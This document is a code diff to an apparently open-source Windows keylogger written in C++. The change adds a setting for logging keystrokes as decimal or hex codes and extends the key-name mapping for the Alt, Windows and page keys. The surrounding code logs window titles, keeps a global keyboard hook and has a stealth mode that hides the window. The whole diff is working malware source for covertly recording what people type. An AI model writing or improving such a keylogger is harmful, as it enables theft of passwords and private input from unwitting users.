@@ -8,7 +8,9 @@
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
 #define visible // (visible / invisible)
-
+// defines which format to use for logging
+// 0 for default, 10 for dec codes, 16 for hex codex
+#define FORMAT 0 
 // variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
 // or you will get problems since every function uses this variable.
 HHOOK _hook;
@@ -100,93 +102,120 @@ int Save(int key_stroke)
             output << "\n\n[Window: " << window_title << " - at " << s << "] ";
         }
     }
-
-    if (key_stroke == VK_BACK)
+    int form = FORMAT;
+    switch (form) 
     {
-        output << "[BACKSPACE]";
-    }
-    else if (key_stroke == VK_RETURN)
-    {
-        output << "\n";
-    }
-    else if (key_stroke == VK_SPACE)
-    {
-        output << " ";
-    }
-    else if (key_stroke == VK_TAB)
-    {
-        output << "[TAB]";
-    }
-    else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
-    {
-        output << "[SHIFT]";
-    }
-    else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
-    {
-        output << "[CONTROL]";
-    }
-    else if (key_stroke == VK_ESCAPE)
-    {
-        output << "[ESCAPE]";
-    }
-    else if (key_stroke == VK_END)
-    {
-        output << "[END]";
-    }
-    else if (key_stroke == VK_HOME)
-    {
-        output << "[HOME]";
-    }
-    else if (key_stroke == VK_LEFT)
-    {
-        output << "[LEFT]";
-    }
-    else if (key_stroke == VK_UP)
-    {
-        output << "[UP]";
-    }
-    else if (key_stroke == VK_RIGHT)
-    {
-        output << "[RIGHT]";
-    }
-    else if (key_stroke == VK_DOWN)
-    {
-        output << "[DOWN]";
-    }
-    else if (key_stroke == 190 || key_stroke == 110)
-    {
-        output << ".";
-    }
-    else if (key_stroke == 189 || key_stroke == 109)
-    {
-        output << "-";
-    }
-    else if (key_stroke == 20)
-    {
-        output << "[CAPSLOCK]";
-    }
-    else
-    {
-        char key;
-        // check caps lock
-        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
-
-        // check shift key
-        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
-            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
+    case 10:
+        output << '[' << key_stroke << ']';
+        break;
+    case 16:
+        output << std::hex << "[0x" << key_stroke << ']';
+        break;
+    default:
+        if (key_stroke == VK_BACK)
         {
-            lowercase = !lowercase;
+            output << "[BACKSPACE]";
         }
-
-        // map virtual key according to keyboard layout
-        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
-
-        // tolower converts it to lowercase properly
-        if (!lowercase)
+        else if (key_stroke == VK_RETURN)
         {
-            key = tolower(key);
+            output << "\n";
         }
-        output << char(key);
+        else if (key_stroke == VK_SPACE)
+        {
+            output << " ";
+        }
+        else if (key_stroke == VK_TAB)
+        {
+            output << "[TAB]";
+        }
+        else if ((key_stroke == VK_SHIFT) || (key_stroke == VK_LSHIFT) || (key_stroke == VK_RSHIFT))
+        {
+            output << "[SHIFT]";
+        }
+        else if ((key_stroke == VK_CONTROL) || (key_stroke == VK_LCONTROL) || (key_stroke == VK_RCONTROL))
+        {
+            output << "[CONTROL]";
+        }
+        else if (key_stroke == VK_MENU)
+        {
+            output << "[ALT]";
+        }
+        else if ((key_stroke == VK_LWIN) || (key_stroke == VK_RWIN))
+        {
+            output << "[WIN]";
+        }
+        else if (key_stroke == VK_ESCAPE)
+        {
+            output << "[ESCAPE]";
+        }
+        else if (key_stroke == VK_END)
+        {
+            output << "[END]";
+        }
+        else if (key_stroke == VK_HOME)
+        {
+            output << "[HOME]";
+        }
+        else if (key_stroke == VK_LEFT)
+        {
+            output << "[LEFT]";
+        }
+        else if (key_stroke == VK_UP)
+        {
+            output << "[UP]";
+        }
+        else if (key_stroke == VK_RIGHT)
+        {
+            output << "[RIGHT]";
+        }
+        else if (key_stroke == VK_DOWN)
+        {
+            output << "[DOWN]";
+        }
+        else if (key_stroke == VK_PRIOR)
+        {
+            output << "[PG_UP]";
+        }
+        else if (key_stroke == VK_NEXT)
+        {
+            output << "[PG_DOWN]";
+        }
+        else if (key_stroke == VK_OEM_PERIOD || key_stroke == VK_DECIMAL)
+        {
+            output << ".";
+        }
+        else if (key_stroke == VK_OEM_MINUS || key_stroke == VK_SUBTRACT)
+        {
+            output << "-";
+        }
+        else if (key_stroke == VK_CAPITAL)
+        {
+            output << "[CAPSLOCK]";
+        }
+        else
+        {
+            char key;
+            // check caps lock
+            bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
+
+            // check shift key
+            if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
+                || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
+            {
+                lowercase = !lowercase;
+            }
+
+            // map virtual key according to keyboard layout
+            key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
+
+            // tolower converts it to lowercase properly
+            if (!lowercase)
+            {
+                key = tolower(key);
+            }
+            output << char(key);
+        }
+        break;
     }
 
     // instead of opening and closing file handlers every time, keep file open and flush.
@@ -197,7 +226,6 @@ int Save(int key_stroke)
 
     return 0;
 }
-
 void Stealth()
 {
 #ifdef visible
